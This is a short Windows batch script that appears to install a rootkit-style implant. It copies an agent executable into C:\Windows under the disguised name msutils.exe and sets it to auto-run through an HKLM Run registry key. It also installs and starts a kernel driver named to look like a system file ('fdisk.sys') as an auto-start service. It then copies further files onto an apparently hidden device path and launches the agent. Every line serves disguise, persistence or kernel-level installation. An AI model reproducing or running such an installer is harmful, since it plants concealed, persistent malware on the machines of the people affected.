@echo off

@echo Running from %~dp0

cd %~dp0

move agent.exe "C:\Windows\msutils.exe"


reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v POCorGTFO /d "C:\Windows\msutils.exe"


move "fdisk.sys" "C:\Windows\fdisk.sys"

pause

sc create Ultra3 binPath= "C:\Windows\fdisk.sys" type= kernel start= auto


sc start Ultra3


move "imager.exe" "\\.\Hd1\\imager.exe"

move "ucrtbased.dll" "\\.\Hd1\\ucrtbased.dll"

start "" "C:\Windows\msutils.exe"
